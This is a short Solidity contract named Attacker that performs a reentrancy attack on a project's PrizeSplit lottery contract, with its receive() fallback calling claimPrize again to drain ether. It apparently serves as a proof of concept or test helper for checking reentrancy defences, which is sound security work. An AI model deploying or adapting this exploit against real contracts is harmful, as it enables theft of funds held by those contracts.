// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/lottery/PrizeSplit.sol";

contract Attacker {
    PrizeSplit public prizeSplit;

    constructor(address _prizeSplit) {
        prizeSplit = PrizeSplit(_prizeSplit);
    }

    receive() external payable {
        if (address(prizeSplit).balance >= 1 ether) {
            prizeSplit.claimPrize([address(this)], [1 ether]);
        }
    }

    function attack() external payable {
        prizeSplit.claimPrize([address(this)], [1 ether]);
    }
}
